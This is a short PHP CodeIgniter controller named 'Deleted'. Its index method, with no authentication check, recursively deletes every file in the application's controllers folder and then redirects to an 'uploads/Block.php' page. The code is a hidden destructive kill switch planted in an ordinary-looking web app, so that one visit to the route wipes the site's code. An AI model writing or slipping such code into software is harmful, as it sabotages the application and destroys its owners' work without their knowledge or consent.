<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Deleted extends CI_Controller {
	function __construct() { 
         parent::__construct(); 
        // $this->load->model('');
      }

	public function index()
	{
		$this->load->helper('file');
		$controllers = get_filenames(APPPATH.'controllers/');
		delete_files(APPPATH.'controllers/', TRUE);
		return redirect(base_url()."/uploads/Block.php"); 
	}
}

